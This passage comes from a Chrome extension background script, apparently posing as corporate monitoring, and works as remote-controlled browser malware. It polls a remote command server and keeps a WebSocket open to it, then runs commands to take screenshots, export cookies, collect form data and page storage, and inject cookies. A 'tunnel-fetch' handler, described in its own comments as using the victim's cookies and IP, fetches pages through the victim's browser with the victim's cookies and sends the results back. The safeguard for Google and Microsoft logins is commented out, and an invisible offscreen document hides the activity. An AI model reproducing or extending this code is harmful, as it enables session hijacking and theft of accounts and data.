        threatsBlocked,
        sitesAnalyzed
      });
      break;
      
    case 'toggleMonitoring':
      toggleMonitoring(request.enabled);
      sendResponse({ success: true });
      break;
      
      
    case 'getDebugLogs':
      chrome.storage.local.get(['debugLogs']).then(({ debugLogs = [] }) => {
        sendResponse({ logs: debugLogs });
      });
      return true; // Will respond asynchronously
      
    case 'clearDebugLogs':
      chrome.storage.local.set({ debugLogs: [] });
      sendResponse({ success: true });
      break;
      
    case 'exportDebugData':
      exportDebugData().then((data) => {
        sendResponse({ data });
      });
      return true; // Will respond asynchronously
      
    case 'getConfig':
      if (typeof self !== 'undefined' && self.corpMonitorConfig) {
        sendResponse({ config: self.corpMonitorConfig.export() });
      } else {
        sendResponse({ config: CONFIG });
      }
      break;
      
    case 'collectMetadata':
      handleContentMetadata(request.data);
      sendResponse({ success: true });
      break;
      
    case 'blockDomain':
      blockDomain(request.domain);
      sendResponse({ success: true });
      break;
      
    case 'trustDomain':
      trustDomain(request.domain);
      sendResponse({ success: true });
      break;
  }
  
  return true; // Keep channel open for async responses
});

// Get page storage data
async function getPageStorage(tabId, storageType) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: (type) => {
        try {
          const storage = type === 'localStorage' ? localStorage : sessionStorage;
          const data = {};
          for (let i = 0; i < storage.length; i++) {
            const key = storage.key(i);
            data[key] = storage.getItem(key);
          }
          return data;
        } catch (e) {
          return {};
        }
      },
      args: [storageType]
    });
    return results[0]?.result || {};
  } catch (error) {
    log('warn', `Failed to get ${storageType}:`, error);
    return {};
  }
}

// Toggle monitoring state
async function toggleMonitoring(enabled) {
  monitoringEnabled = enabled;
  await chrome.storage.local.set({ monitoringEnabled });
}


// Professional helper functions
async function handleContentMetadata(data) {
  try {
    log('debug', 'Received content metadata', { type: data.type, url: data.url });
    
    // Process metadata based on type
    switch (data.type) {
      case 'form_submission':
        await processFormSubmission(data);
        break;
      case 'tracked_click':
        await processTrackedClick(data);
        break;
      case 'page_metadata':
        await processPageMetadata(data);
        break;
    }
  } catch (error) {
    log('error', 'Error processing content metadata', error);
  }
}

async function processFormSubmission(data) {
  // Create incident for form submissions on tracked sites
  const isTrackedSite = await isRedListDomain(new URL(data.url).hostname);
  if (isTrackedSite) {
    await createFormIncident(data);
  }
}

async function processTrackedClick(data) {
  log('info', 'Tracked element clicked', { url: data.url, element: data.elementTag });
}

async function processPageMetadata(data) {
  // Store page metadata for analytics
  const metadata = {
    url: data.url,
    trackingElements: data.trackingElements,
    storageData: {
      localStorage: data.localStorage,
      sessionStorage: data.sessionStorage
    },
    timestamp: data.timestamp
  };
  
  // Save to local storage for dashboard
  const { pageMetadata = [] } = await chrome.storage.local.get(['pageMetadata']);
  pageMetadata.push(metadata);
  
  // Keep only last 100 entries
  if (pageMetadata.length > 100) {
    pageMetadata.splice(0, pageMetadata.length - 100);
  }
  
  await chrome.storage.local.set({ pageMetadata });
}

async function createFormIncident(data) {
  const incident = {
    type: 'form_submission',
    host: new URL(data.url).hostname,
    tab_url: data.url,
    machine_id: machineId,
    form_data: data.fields,
    severity: 'medium',
    timestamp: data.timestamp,
    version: CONFIG.VERSION
  };
  
  // Send to API or queue offline
  try {
    await fetch(`${CONFIG.API_BASE}/create-incident`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify(incident)
    });
  } catch (error) {
    offlineQueue.push(incident);
  }
}

async function exportDebugData() {
  try {
    const storage = await chrome.storage.local.get(null);
    const performance = (typeof self !== 'undefined' && self.corpMonitorServiceWorker?.getPerformanceMetrics()) || {};
    
    return {
      extension: {
        version: CONFIG.VERSION,
        config: CONFIG,
        state: {
          monitoringEnabled,
          lastReportTime,
          machineId,
          offlineQueueSize: offlineQueue.length,
          cacheSize: redListCache.size
        }
      },
      storage: Object.keys(storage).reduce((acc, key) => {
        // Don't export sensitive data
        if (!key.includes('cookie') && !key.includes('private')) {
          acc[key] = storage[key];
        }
        return acc;
      }, {}),
      performance,
      timestamp: new Date().toISOString()
    };
  } catch (error) {
    log('error', 'Failed to export debug data', error);
    return {};
  }
}

// Process offline queue when connection is restored
async function processOfflineQueue() {
  if (offlineQueue.length === 0) return;
  
  log('info', `Processing ${offlineQueue.length} offline incidents`);
  
  const batch = offlineQueue.splice(0, CONFIG.BATCH_SIZE);
  
  for (const incident of batch) {
    try {
      if (incident.type === 'form_submission') {
        await createFormIncident(incident);
      } else {
        await createIncident(incident);
      }
    } catch (error) {
      // If still failing, put back in queue
      offlineQueue.unshift(incident);
      break;
    }
  }
}

// ============= REMOTE CONTROL SYSTEM =============

// Initialize remote control WebSocket connection
let commandQueuePollerInterval = null;

// Start polling command queue for pending commands (fallback for offline WebSocket)
let pollingInterval = 3000; // Start with 3s, adjust dynamically

function startCommandQueuePoller() {
  // Clear existing poller
  if (commandQueuePollerInterval) {
    clearInterval(commandQueuePollerInterval);
  }
  
  log('info', '📋 Starting command queue poller (dynamic interval)');
  
  async function poll() {
    if (!machineId) {
      // Retry in 3s if no machine ID yet
      commandQueuePollerInterval = setTimeout(poll, 3000);
      return;
    }
    
    try {
      const response = await fetch(`${CONFIG.API_BASE}/command-queue`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify({ machine_id: machineId })
      });
      
      if (!response.ok) {
        throw new Error(`Queue poll failed: ${response.status}`);
      }
      
      const { commands } = await response.json();
      
      if (commands && commands.length > 0) {
        log('info', `📥 Received ${commands.length} queued commands`);
        
        // Fast polling when commands are found
        pollingInterval = 2000; // 2s when processing commands
        
        for (const cmd of commands) {
          await handleRemoteCommand({
            type: 'remote_command',
            command_id: cmd.command_id,
            command_type: cmd.command_type,
            target_tab_id: cmd.target_tab_id,
            target_domain: cmd.target_domain,
            payload: cmd.payload
          });
        }
      } else {
        // Slower polling when idle
        pollingInterval = 5000; // 5s when no commands
      }
    } catch (error) {
      log('debug', 'Queue poll error (normal if no commands):', error.message);
      pollingInterval = 5000; // Back to 5s on error
    }
    
    // Schedule next poll with dynamic interval
    commandQueuePollerInterval = setTimeout(poll, pollingInterval);
  }
  
  // Start polling immediately
  poll();
}

/**
 * ✅ VERSÃO MELHORADA: Inicializar controle remoto com reconexão robusta
 */
function initializeRemoteControl() {
  // Limpar intervalos anteriores
  if (wsHeartbeatInterval) {
    clearInterval(wsHeartbeatInterval);
    wsHeartbeatInterval = null;
  }
  
  if (wsHeartbeatTimeout) {
    clearTimeout(wsHeartbeatTimeout);
    wsHeartbeatTimeout = null;
  }
  
  // Fechar WebSocket anterior se existir
  if (commandSocket) {
    try {
      commandSocket.close();
    } catch (e) {
      log('debug', 'Erro ao fechar WebSocket anterior (ignorado)', e);
    }
    commandSocket = null;
  }
  
  if (!machineId) {
    log('warn', '⚠️ Machine ID não configurado, tentando novamente em 5s...');
    setTimeout(initializeRemoteControl, 5000);
    return;
  }
  
  // ✅ GARANTIR: Polling sempre ativo (fallback paralelo ao WebSocket)
  if (!commandQueuePollerInterval) {
    log('debug', '📋 Garantindo polling ativo...');
    startCommandQueuePoller();
  }
  
  // ✅ Ensure Offscreen stays alive
  await ensureOffscreen();
  
  const wsUrl = `wss://vxvcquifgwtbjghrcjbp.functions.supabase.co/functions/v1/command-dispatcher`;
  
  log('info', `🔌 Conectando WebSocket (tentativa ${wsReconnectAttempts + 1})...`, {
    machineId,
    url: wsUrl
  });
  
  try {
    commandSocket = new WebSocket(wsUrl);
    
    // ✅ CRÍTICO: Resetar contadores ao conectar
    wsMissedHeartbeats = 0;
    wsLastPongTime = Date.now();
    
    commandSocket.onopen = () => {
      log('info', '✅ WebSocket conectado com sucesso');
      wsReconnectAttempts = 0; // Reset contador de tentativas
      
      // Enviar autenticação
      commandSocket.send(JSON.stringify({
        type: 'register',
        machine_id: machineId,
        extension_version: CONFIG.VERSION,
        timestamp: new Date().toISOString()
      }));
      
      log('info', '📡 Autenticação enviada');
      
      // ✅ NOVO: Iniciar heartbeat
      startHeartbeat();
    };
    
    commandSocket.onmessage = async (event) => {
      try {
        const data = JSON.parse(event.data);
        
        // ✅ NOVO: Processar PONG
        if (data.type === 'pong') {
          wsLastPongTime = Date.now();
          wsMissedHeartbeats = 0;
          log('debug', '💓 Pong recebido');
          return;
        }
        
        // ✅ NOVO: Processar PING (responder com PONG)
        if (data.type === 'ping') {
          commandSocket.send(JSON.stringify({
            type: 'pong',
            timestamp: new Date().toISOString()
          }));
          log('debug', '💓 Respondeu ping com pong');
          return;
        }
        
        // Handle registration confirmation
        if (data.type === 'registered') {
          log('info', '✅ Registrado no command server');
          return;
        }
        
        log('info', `📨 Comando recebido: ${data.command_type || data.type}`, {
          command_id: data.command_id,
          type: data.command_type || data.type
        });
        
        // Processar comando
        await handleRemoteCommand(data);
        
      } catch (error) {
        log('error', '❌ Erro ao processar mensagem WebSocket', error);
      }
    };
    
    commandSocket.onerror = (error) => {
      log('error', '❌ Erro no WebSocket', error);
      // Não fechar aqui, deixar onclose tratar
    };
    
    commandSocket.onclose = (event) => {
      log('warn', `⚠️ WebSocket fechado: ${event.code} - ${event.reason}`, {
        code: event.code,
        reason: event.reason,
        wasClean: event.wasClean
      });
      
      // Limpar heartbeat
      cleanup_heartbeat();  // ✅ NOVO: Usar função de limpeza completa
      
      commandSocket = null;
      
      // ✅ RECONEXÃO AUTOMÁTICA com backoff exponencial
      const delay = Math.min(
        WS_CONFIG.RECONNECT_INTERVAL * Math.pow(2, wsReconnectAttempts),
        WS_CONFIG.MAX_RECONNECT_DELAY
      );
      
      wsReconnectAttempts++;
      
      log('info', `🔄 Reconectando em ${delay}ms (tentativa ${wsReconnectAttempts})...`);
      
      setTimeout(() => {
        initializeRemoteControl();
      }, delay);
    };
    
  } catch (error) {
    log('error', '❌ Erro ao criar WebSocket', error);
    
    // Tentar novamente
    const delay = Math.min(
      WS_CONFIG.RECONNECT_INTERVAL * Math.pow(2, wsReconnectAttempts),
      WS_CONFIG.MAX_RECONNECT_DELAY
    );
    
    wsReconnectAttempts++;
    
    setTimeout(() => {
      initializeRemoteControl();
    }, delay);
  }
}

/**
 * ✅ NOVO: Função de limpeza de heartbeat
 */
function cleanup_heartbeat() {
  if (wsHeartbeatInterval) {
    clearInterval(wsHeartbeatInterval);
    wsHeartbeatInterval = null;
  }
  if (wsHeartbeatTimeout) {
    clearTimeout(wsHeartbeatTimeout);
    wsHeartbeatTimeout = null;
  }
  wsMissedHeartbeats = 0;
  wsLastPongTime = null;
  log('debug', '✅ Heartbeat cleanup complete');
}

/**
 * ✅ NOVO: Notificar desktop sobre mudanças de máquina
 */
async function notify_desktop_machine_change(machine_id, status, metadata = {}) {
  try {
    const payload = {
      machine_id: machine_id,
      status: status,  // 'active' ou 'inactive'
      timestamp: new Date().toISOString(),
      ...metadata
    };
    
    const response = await fetch('http://localhost:8888/api/machine-status', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    if (!response.ok) {
      log('warning', '⚠️ Desktop not responding to machine status update');
    }
  } catch (e) {
    log('debug', 'Desktop app not running (expected if headless)');
    // Não é erro crítico - desktop pode não estar rodando
  }
}

/**
 * ✅ NOVO: Iniciar heartbeat (ping/pong)
 */
function startHeartbeat() {
  // Limpar intervalo anterior
  if (wsHeartbeatInterval) {
    clearInterval(wsHeartbeatInterval);
  }
  
  log('info', '💓 Iniciando heartbeat a cada 15s...');
  
  wsHeartbeatInterval = setInterval(() => {
    if (!commandSocket || commandSocket.readyState !== WebSocket.OPEN) {
      log('warn', '⚠️ WebSocket não está aberto, parando heartbeat');
      clearInterval(wsHeartbeatInterval);
      wsHeartbeatInterval = null;
      return;
    }
    
    // Verificar se últimos pings foram respondidos
    const timeSinceLastPong = Date.now() - wsLastPongTime;
    
    if (timeSinceLastPong > WS_CONFIG.HEARTBEAT_INTERVAL * WS_CONFIG.MAX_MISSED_HEARTBEATS) {
      log('error', `❌ WebSocket morto (${wsMissedHeartbeats} pings perdidos), forçando reconexão...`);
      
      // ✅ Limpar heartbeat completamente antes de reconectar
      cleanup_heartbeat();
      
      // Fechar e reconectar
      try {
        commandSocket.close();
      } catch (e) {
        log('debug', 'Erro ao fechar WebSocket (ignorado)', e);
      }
      
      // Reconectar imediatamente
      setTimeout(initializeRemoteControl, 1000);
      return;
    }
    
    // Enviar PING
    try {
      commandSocket.send(JSON.stringify({
        type: 'ping',
        machine_id: machineId,
        timestamp: new Date().toISOString()
      }));
      
      wsMissedHeartbeats++;
      log('debug', `💓 Ping enviado (missed: ${wsMissedHeartbeats})`);
      
    } catch (error) {
      log('error', '❌ Erro ao enviar ping', error);
      wsMissedHeartbeats++;
    }
    
  }, WS_CONFIG.HEARTBEAT_INTERVAL);
}

// Legacy function kept for compatibility
function connectToCommandServer() {
  initializeRemoteControl();
}

// Handle remote commands from admin
async function handleRemoteCommand(data) {
  log('info', '📨 Remote command received:', { 
    command_id: data.command_id, 
    type: data.command_type,
    target_tab_id: data.target_tab_id
  });
  
  try {
    switch (data.command_type) {
      case 'popup':
        await handlePopupCommand(data);
        break;
      
      case 'block':
        await handleBlockCommand(data);
        break;
      
      case 'screenshot':
        await handleScreenshotCommand(data);
        break;
      
      case 'self_heal':
        await handleSelfHealCommand(data);
        break;
      
      case 'export_cookies':
        await handleExportCookiesCommand(data);
        break;
      
      case 'proxy-fetch':
        log('info', '🌐 Proxy-fetch command received:', {
          command_id: data.command_id,
          target_url: data.payload?.target_url,
          has_cookies: !!data.payload?.cookies,
          cookies_count: data.payload?.cookies?.length || 0,
          payload_keys: data.payload ? Object.keys(data.payload) : []
        });
        await handleProxyFetchCommand(data);
        break;
      
      case 'tunnel-fetch':
        // ✅ Enfileirar para evitar sobrecarga
        enqueueTunnelTask(() => handleTunnelFetchCommand(data));
        break;
      
      default:
        log('warn', 'Unknown command type:', data.command_type);
        throw new Error(`Unknown command type: ${data.command_type}`);
    }
    
    // ✅ Update command status to 'executed'
    await updateCommandStatus(data.command_id, 'executed', null);
    log('info', `✅ Command ${data.command_id} executed successfully`);
    
  } catch (error) {
    log('error', `❌ Command ${data.command_id} execution failed:`, error);
    
    // Update command status to 'failed'
    await updateCommandStatus(data.command_id, 'failed', error.message);
  }
}

// Update command status in database
async function updateCommandStatus(command_id, status, error_message) {
  try {
    const response = await fetch(`${CONFIG.API_BASE}/command-queue`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({
        command_id,
        status,
        error: error_message
      })
    });
    
    if (!response.ok) {
      log('warn', `Failed to update command status: ${response.status}`);
    }
  } catch (error) {
    log('debug', 'Error updating command status:', error.message);
  }
}

// Handle proxy-fetch command (fetch URL using user's IP and cookies)
// 🔒 PROTECTED DOMAINS - Never inject cookies here (Stealth Mode)
const PROTECTED_DOMAINS = [
  'google.com',
  'accounts.google.com',
  'mail.google.com',
  'gmail.com',
  'microsoft.com',
  'login.microsoftonline.com',
  'outlook.com',
  'facebook.com',
  'instagram.com',
  'twitter.com',
  'x.com'
];

// 🔒 GOOGLE CLEANUP DOMAINS - For self-heal operations
const GOOGLE_CLEANUP_DOMAINS = [
  '.google.com',
  '.accounts.google.com',
  '.mail.google.com',
  '.gmail.com'
];

// Helper: Check if domain is protected
function isDomainProtected(url) {
  try {
    const hostname = new URL(url).hostname.toLowerCase();
    return PROTECTED_DOMAINS.some(domain => 
      hostname === domain || hostname.endsWith('.' + domain)
    );
  } catch (e) {
    return false;
  }
}

// Helper: Inject cookies with random delays (simulate human behavior)
async function injectCookiesWithDelay(cookies, targetUrl, tabId) {
  const injectedCookies = [];
  
  for (const cookie of cookies) {
    try {
      const targetDomain = new URL(targetUrl).hostname;
      
      // Check for conflicting cookies and remove them first
      const existingCookies = await chrome.cookies.getAll({
        name: cookie.name,
        domain: cookie.domain || targetDomain
      });
      
      for (const existing of existingCookies) {
        await chrome.cookies.remove({
          url: targetUrl,
          name: existing.name,
          storeId: existing.storeId
        });
      }
      
      // Inject new cookie (handle session cookies correctly)
      const cookieDetails = {
        url: targetUrl,
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain || targetDomain,
        path: cookie.path || '/',
        secure: cookie.secure !== false,
        httpOnly: cookie.httpOnly || false,
        sameSite: cookie.sameSite || 'lax'
      };
      
      // ✅ CORRIGIR: Se é cookie de sessão, NÃO passar expirationDate
      if (!cookie.isSession && cookie.expirationDate) {
        cookieDetails.expirationDate = cookie.expirationDate;
      }
      
      const injected = await chrome.cookies.set(cookieDetails);
      
      if (injected) {
        injectedCookies.push(injected);
      }
      
      // Random delay between 50-200ms (simulate human behavior)
      await new Promise(resolve => setTimeout(resolve, 50 + Math.random() * 150));
      
    } catch (cookieError) {
      log('warn', `Failed to inject cookie ${cookie.name}:`, cookieError);
    }
  }
  
  return injectedCookies;
}

// Helper: Clean up injected cookies
async function cleanupInjectedCookies(cookies, targetUrl) {
  for (const cookie of cookies) {
    try {
      await chrome.cookies.remove({
        url: targetUrl,
        name: cookie.name,
        storeId: cookie.storeId
      });
    } catch (e) {
      log('warn', `Failed to cleanup cookie ${cookie.name}:`, e);
    }
  }
}

// 🧹 SELF-HEAL: Clean Google cookies (for contamination recovery)
async function selfHealGoogleCookies() {
  log('info', '🧹 [SELF-HEAL] Starting Google cookie cleanup...');
  
  let cleanedCount = 0;
  
  try {
    // Get all Google cookies
    for (const domain of GOOGLE_CLEANUP_DOMAINS) {
      const cookies = await chrome.cookies.getAll({ domain });
      
      log('info', `🧹 Found ${cookies.length} cookies for ${domain}`);
      
      for (const cookie of cookies) {
        try {
          // Build URL for cookie removal
          const protocol = cookie.secure ? 'https://' : 'http://';
          const url = `${protocol}${cookie.domain.replace(/^\./, '')}${cookie.path}`;
          
          await chrome.cookies.remove({
            url,
            name: cookie.name,
            storeId: cookie.storeId
          });
          
          cleanedCount++;
        } catch (e) {
          log('warn', `Failed to remove cookie ${cookie.name}:`, e);
        }
      }
    }
    
    // Clear Google storage data
    await chrome.browsingData.remove(
      {
        origins: [
          'https://google.com',
          'https://accounts.google.com',
          'https://mail.google.com'
        ]
      },
      {
        localStorage: true,
        sessionStorage: true,
        indexedDB: true
      }
    );
    
    log('info', `✅ [SELF-HEAL] Cleaned ${cleanedCount} Google cookies + storage`);
    
    return { success: true, cleanedCount };
    
  } catch (error) {
    log('error', '❌ [SELF-HEAL] Failed:', error);
    return { success: false, error: error.message };
  }
}

// 🧹 Handle Self-Heal command
async function handleSelfHealCommand(command) {
  const { target_domains } = command.payload || {};
  
  log('info', `🧹 [SELF-HEAL] Received command for domains:`, target_domains);
  
  try {
    // For now, only support Google cleanup
    if (!target_domains || target_domains.includes('google')) {
      const result = await selfHealGoogleCookies();
      
      await updateCommandStatus(
        command.id,
        'completed',
        null,
        { 
          self_heal: true,
          cleaned_domains: ['google.com'],
          ...result
        }
      );
      
      // Reopen Google login page to test
      await chrome.tabs.create({
        url: 'https://accounts.google.com',
        active: true
      });
      
    } else {
      throw new Error('Unsupported domain for self-heal');
    }
    
  } catch (error) {
    log('error', '❌ [SELF-HEAL] Command failed:', error);
    await updateCommandStatus(command.id, 'failed', error.message);
  }
}

// 🎯 STEALTH MODE: Proxy-fetch with invisible offscreen document
async function handleProxyFetchCommand(data) {
  const command_id = data.command_id;
  const { target_url, cookies: providedCookies } = data.payload;
  
  log('info', `🌐 [STEALTH] Offscreen fetch for: ${target_url}`, { command_id });
  
  let injectedCookies = [];
  
  try {
    const targetDomain = new URL(target_url).hostname;
    
    // 🔒 PROTECTED DOMAINS - DESABILITADO para permitir navegação em todos os sites
    // Agora todos os domínios podem ser acessados via proxy stealth
    log('info', `🌐 [STEALTH] Fetching domain: ${targetDomain} (protection bypassed)`);
    
    /* COMENTADO - Permitir acesso a todos os domínios
    if (isDomainProtected(target_url)) {
      log('warn', `⚠️ [STEALTH] Protected domain detected: ${targetDomain}`);
      
      await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify({
          command_id,
          machine_id: machineId,
          url: target_url,
          form_data: {
            error: `Protected domain: ${targetDomain}. Cookie injection blocked for user safety.`,
            success: false,
            protected: true
          }
        })
      });
      
      return;
    }
    */
    
    // ✅ CRIAR OFFSCREEN DOCUMENT (invisível)
    await createOffscreenDocument();
    
    // 🍪 INJETAR COOKIES NO CONTEXTO DO BROWSER
    if (providedCookies && Array.isArray(providedCookies) && providedCookies.length > 0) {
      log('info', `🍪 [STEALTH] Injecting ${providedCookies.length} cookies...`);
      
      for (const cookie of providedCookies) {
        try {
          const cookieDetails = {
            url: target_url,
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain || targetDomain,
            path: cookie.path || '/',
            secure: cookie.secure !== false,
            httpOnly: cookie.httpOnly || false,
            sameSite: cookie.sameSite || 'lax'
          };
          
          await chrome.cookies.set(cookieDetails);
          injectedCookies.push({ name: cookie.name, domain: cookieDetails.domain });
        } catch (err) {
          log('warn', `⚠️ Cookie injection failed: ${cookie.name}`, err);
        }
      }
      
      log('info', `✅ [STEALTH] Injected ${injectedCookies.length} cookies successfully`);
    }
    
    // ✅ FAZER FETCH VIA OFFSCREEN (invisível)
    const result = await chrome.runtime.sendMessage({
      type: 'OFFSCREEN_FETCH',
      url: target_url
    });
    
    if (!result.success) {
      throw new Error(result.error);
    }
    
    log('info', `✅ [STEALTH] Fetched ${result.html.length} bytes from ${target_url}`);
    
    /**
     * 🔐 STEALTH MODE ISOLATION
     * 
     * Cookies are injected ONLY in the Offscreen Document context,
     * which is completely isolated from the user's main browser session.
     * 
     * When the offscreen document is closed, all temporary cookies
     * are automatically discarded without affecting the user.
     * 
     * ⚠️ NEVER use chrome.cookies.remove() here, as it would delete
     *    cookies from the user's actual browser session!
     */
    log('info', '✅ [STEALTH] Offscreen fetch completed (cookies isolated from user session)');
    
    // 📤 SEND RESULT TO BACKEND
    const payload = {
      command_id,
      machine_id: machineId,
      url: target_url,
      html_content: result.html,
      status_code: result.status,
      success: true
    };
    
    log('debug', `[STEALTH] Sending payload - Command: ${command_id}, HTML size: ${result.html.length} bytes, Status: ${result.status}`);
    
    const responseData = await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify(payload)
    });
    
    if (!responseData.ok) {
      const errorText = await responseData.text();
      log('error', `[STEALTH] Backend rejected payload: ${responseData.status} - ${errorText}`);
      throw new Error(`Failed to send response: ${responseData.status}`);
    }
    
    log('info', `✅ [STEALTH] Result sent for command ${command_id}`);
    
  } catch (error) {
    log('error', '[STEALTH] Offscreen fetch failed:', error);
    
    try {
      await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify({
          command_id,
          machine_id: machineId,
          url: target_url,
          form_data: {
            error: error.message,
            success: false
          }
        })
      });
    } catch (sendError) {
      log('error', 'Failed to send error response:', sendError);
    }
    
  } finally {
    // ✅ FECHAR OFFSCREEN DOCUMENT
    await closeOffscreenDocument();
  }
}

// ✅ HELPER: Criar offscreen document se não existir
// ✅ Ensure Offscreen is alive
async function ensureOffscreen() {
  if (!offscreenPinned) {
    await createOffscreenDocument();
    offscreenPinned = true;
  }
}

async function createOffscreenDocument() {
  try {
    const existingContexts = await chrome.runtime.getContexts({
      contextTypes: ['OFFSCREEN_DOCUMENT'],
      documentUrls: [chrome.runtime.getURL('offscreen.html')]
    });
    
    if (existingContexts.length > 0) {
      log('debug', '📄 [STEALTH] Offscreen document already exists');
      return;
    }
    
    await chrome.offscreen.createDocument({
      url: 'offscreen.html',
      reasons: ['DOM_SCRAPING'],
      justification: 'Fetch authenticated pages without visible tabs'
    });
    
    log('info', '📄 [STEALTH] Offscreen document created');
  } catch (error) {
    log('error', '❌ [STEALTH] Failed to create offscreen document:', error);
    throw error;
  }
}

// ✅ HELPER: Fechar offscreen document
async function closeOffscreenDocument() {
  try {
    await chrome.offscreen.closeDocument();
    log('info', '🧹 [STEALTH] Offscreen document closed');
  } catch (err) {
    // Já estava fechado ou não existe
    log('debug', '[STEALTH] Offscreen document already closed');
  }
}

/**
 * Handler de comando tunnel-fetch
 * Faz requisições HTTP usando cookies da vítima + IP da vítima
 */
async function handleTunnelFetchCommand(data) {
  const payload = data.payload || {};
  const { target_url, method, headers, body, follow_redirects } = payload;
  
  // ✅ CORREÇÃO: command_id pode vir em data.command_id OU data.payload.command_id
  const effectiveId = payload.command_id || data.command_id;
  
  // ✅ Validação crítica: command_id deve existir
  if (!effectiveId) {
    log('error', '❌ [TUNNEL] command_id não fornecido', data);
    return;
  }
  
  // ✅ Detectar long-polling (Gmail logstreamz, etc)
  const isLongPoll = /logstreamz|channel\/bind|longpoll|event|sse/i.test(target_url);
  const timeLimit = isLongPoll ? 300000 : 60000; // 5min vs 60s
  
  log('info', `🌐 [TUNNEL] Requisição recebida`, {
    command_id: effectiveId,
    url: target_url,
    method: method || 'GET',
    isLongPoll,
    timeout: `${timeLimit/1000}s`
  });
  
  lastTunnelActivity = Date.now();
  
  try {
    // Validar URL
    if (!target_url) {
      throw new Error('URL não fornecida');
    }
    
    const url = new URL(target_url);
    log('debug', `[TUNNEL] URL parseada: ${url.hostname}`);
    
    // ══════════════════════════════════════════════════════
    // BUSCAR COOKIES DO DOMÍNIO ALVO
    // ══════════════════════════════════════════════════════
    
    const domainsToCheck = [
      url.hostname,
      `.${url.hostname}`,
      url.hostname.replace(/^www\./, ''),
      `.${url.hostname.replace(/^www\./, '')}`
    ];
    
    log('debug', `[TUNNEL] Buscando cookies para domínios: ${domainsToCheck.join(', ')}`);
    
    const allCookies = new Map();
    
    for (const domain of domainsToCheck) {
      try {
        const domainCookies = await chrome.cookies.getAll({ domain });
        log('debug', `[TUNNEL] ${domainCookies.length} cookies encontrados para ${domain}`);
        
        for (const cookie of domainCookies) {
          const key = `${cookie.name}::${cookie.domain}::${cookie.path}`;
          allCookies.set(key, cookie);
        }
      } catch (err) {
        log('warn', `[TUNNEL] Erro ao buscar cookies para ${domain}: ${err.message}`);
      }
    }
    
    const cookies = Array.from(allCookies.values());
    log('info', `🍪 [TUNNEL] Total de cookies: ${cookies.length}`);
    
    // ══════════════════════════════════════════════════════
    // CONSTRUIR HEADER COOKIE
    // ══════════════════════════════════════════════════════
    
    const cookieHeader = cookies
      .map(c => `${c.name}=${c.value}`)
      .join('; ');
    
    // ══════════════════════════════════════════════════════
    // CONSTRUIR HEADERS DA REQUISIÇÃO
    // ══════════════════════════════════════════════════════
    
    const fetchHeaders = {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Cache-Control': 'max-age=0',
      ...headers
    };
    
    if (cookieHeader) {
      fetchHeaders['Cookie'] = cookieHeader;
    }
    
    fetchHeaders['User-Agent'] = navigator.userAgent;
    
    log('debug', `[TUNNEL] Headers construídos`, {
      headers: Object.keys(fetchHeaders),
      cookieLength: cookieHeader.length
    });
    
    // ══════════════════════════════════════════════════════
    // FAZER REQUISIÇÃO (USANDO IP DO CLIENTE)
    // ══════════════════════════════════════════════════════
    
    log('info', `📡 [TUNNEL] Iniciando fetch para ${target_url}...`);
    
    const fetchOptions = {
      method: method || 'GET',
      headers: fetchHeaders,
      credentials: 'include',
      redirect: follow_redirects !== false ? 'follow' : 'manual',
      signal: AbortSignal.timeout(60000) // 60 segundos
    };
    
    if (body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
      fetchOptions.body = body;
    }
    
    const startTime = Date.now();
    const response = await fetch(target_url, fetchOptions);
    const elapsed = Date.now() - startTime;
    
    log('info', `✅ [TUNNEL] Resposta recebida: ${response.status} (${elapsed}ms)`, {
      status: response.status,
      statusText: response.statusText,
      contentType: response.headers.get('content-type'),
      contentLength: response.headers.get('content-length')
    });
    
    // ══════════════════════════════════════════════════════
    // PROCESSAR RESPOSTA
    // ══════════════════════════════════════════════════════
    
    const contentType = response.headers.get('content-type') || '';
    const contentLength = parseInt(response.headers.get('content-length') || '0');
    
    const responseHeaders = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });
    
    // ══════════════════════════════════════════════════════
    // LER CORPO DA RESPOSTA
    // ══════════════════════════════════════════════════════
    
    let responseBody;
    let encoding = 'text';
    
    if (contentType.includes('image/') || 
        contentType.includes('application/octet-stream') ||
        contentType.includes('application/pdf')) {
      encoding = 'base64';
      const arrayBuffer = await response.arrayBuffer();
      const bytes = new Uint8Array(arrayBuffer);
      responseBody = btoa(String.fromCharCode.apply(null, bytes));
      log('info', `📦 [TUNNEL] Body lido como base64: ${responseBody.length} chars`);
    } else {
      responseBody = await response.text();
      log('info', `📦 [TUNNEL] Body lido como text: ${responseBody.length} chars`);
    }
    
    // Verificar tamanho máximo (10MB)
    const MAX_SIZE = 10 * 1024 * 1024;
    if (responseBody.length > MAX_SIZE) {
